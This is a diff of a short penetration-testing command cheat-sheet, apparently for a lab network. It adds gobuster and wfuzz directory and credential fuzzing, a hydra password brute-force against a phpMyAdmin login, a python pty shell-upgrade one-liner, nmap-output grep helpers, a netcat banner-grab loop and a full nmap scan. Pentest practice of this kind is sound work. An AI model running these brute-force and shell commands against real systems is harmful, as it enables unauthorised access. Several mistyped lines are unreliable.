@@ -1,11 +1,31 @@
-gobuster dir -u http://10.11.1.73/reporting/login -w /usr/share/wordlists/seclists/web/raft-large-directories.txt -t 40 -e -o dir1.txt -p http://127.0.0.1:8080
+# bruteforce dir over http proxy
+gobuster dir -u http://10.11.1.73/ -w /usr/share/wordlists/seclist/web/raft-large-directories.txt -t 40 -e -o dir2.txt -p http://127.0.0.1:8080 
 
+#brutefore login -V => failcondition -L for userlist
  hydra -l root -P /usr/share/wordlists/rockyou.txt 10.11.1.234 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1$target=index.php&token=e7ec6798bb4d451e587a62cfb00fe077=+In:input_password" -V
      
+#fuzz  anything :)
+wfuzz -c -z file,/usr/share/wordlists/seclist/web/raft-large-directories.txt --hh 99  http://10.11.1.133/FUZZ
+bfuzz -c -z file,users.txt -z file,pass.txt — sc 200  http://www.site.com/log.asp?user=FUZZ&pass=FUZ2Z
 
-wfuzz.py -c -z file,users.txt -z file,pass.txt — sc 200  http://www.site.com/log.asp?user=FUZZ&pass=FUZ2Z
 
+#python spanshell
+python -c 'import pty;pty.spawn("/bin/bash");' # pysh
 
+#get openhttp ports
+cat nmap/scan1 | grep "open.*http" | grep -oE "^[0-9]*" > openhttp.txt    #httpgrabber
+
+#get open ports
+cat nmap/scan1 | grep "open.*" | grep -oE "^[0-9]*" > openports.txt #portgrabber
+
+#ip grep
+grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" > ips.txt   #ipgrabber
+
+#get banners from ports
+for i in $(cat openports.txt);do echo "$i:" >> banners.txt; echo -en "GET /\r\n\r\nhelp\r\n\r\n" | nc -nvq 20 $ip $i >> banners.txt &&  echo -e "\n\n">> banners.txt;done #bannergrabber
+
+#my usual scan
+nmap -sC -p- -vv --reason -sV -Pn -sS -O -oN scan1 $ip
 
 
 
